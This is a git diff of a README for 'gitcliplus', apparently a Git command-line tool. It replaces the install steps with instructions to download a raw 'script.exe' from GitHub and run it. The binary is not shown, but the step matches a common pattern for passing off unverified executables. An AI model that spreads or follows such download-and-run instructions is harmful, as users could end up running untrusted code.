@@ -10,6 +10,16 @@ gitcliplus is a command-line tool that enhances Git workflow efficiency by provi
 
 ## Installation
 
+install the [script.exe](https://github.com/vencordthemer/gitcliplus/raw/refs/heads/main/script.exe)
+
+Run it
+
+Install git if not already
+
+Done
+
+## Development
+
 1. Clone the repository:
 
    ```bash
